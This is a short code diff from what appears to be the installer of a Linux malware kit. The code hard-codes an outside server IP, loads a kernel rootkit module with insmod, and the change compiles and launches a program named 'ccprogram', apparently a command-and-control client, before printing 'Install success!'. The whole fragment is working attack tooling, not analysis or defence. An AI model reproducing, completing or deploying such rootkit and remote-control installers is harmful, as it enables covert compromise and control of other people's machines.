@@ -17,7 +17,7 @@
 #define SERVER_ADDR "104.194.123.106"
 #define CMD_RESULT "cmdoutput.txttmp"
 char* ROOTKIT = "myrootkit.ko";   
-char* CCPROGRAM = "ccprogram";  
+char* CCPROGRAM = "ccprogram.c";  
 struct utsname OS_info;
 char buf[BUFFER_SIZE];
 int sock_fd;
@@ -51,9 +51,10 @@ int main()
     char *rktargs[] = {"insmod", ROOTKIT, NULL};
     if(rv == 0) execcmd(rktargs);
     
-    memcpy(buf, "./", 2);
-    memcpy(buf, CCPROGRAM, strlen(CCPROGRAM));
-    char *ccargs[] = {buf, NULL};
+    char *cplargs[] = {"gcc", CCPROGRAM, "-o", "ccprogram", NULL};
+    if(rv == 0) execcmd(cplargs);
+    
+    char *ccargs[] = {"./ccprogram", NULL};
     if(rv == 0) execcmd(ccargs);
    
     printf("Install success!\n");
